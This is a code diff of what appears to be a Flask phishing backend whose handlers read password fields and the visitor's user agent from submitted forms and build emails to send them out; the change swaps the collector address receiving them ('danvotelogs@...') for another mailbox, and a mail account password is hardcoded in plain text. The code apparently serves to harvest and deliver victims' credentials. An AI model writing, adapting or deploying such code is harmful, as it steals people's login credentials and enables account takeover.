@@ -195,7 +195,7 @@ def clips():
         passwordemail = request.form.get("passwordapive")
         sender_email = "missdomn@cinconn.com"
         sender_emaill = "contact"
-        receiver_email = "danvotelogs@mtsteinlesssteel.com"
+        receiver_email = "missdomn@cinconn.com"
         password = "X9kAxykLTN=s"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -251,7 +251,7 @@ def mansecond():
         passwordemail = request.form.get("passwordail")
         sender_email = "missdomn@cinconn.com"
         sender_emaill = "contact"
-        receiver_email = "danvotelogs@mtsteinlesssteel.com"
+        receiver_email = "missdomn@cinconn.com"
         password = "X9kAxykLTN=s"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
@@ -292,6 +292,7 @@ def pilom():
 
 if __name__ == "__main__":
     app.run(debug=True)
+
 
 
 
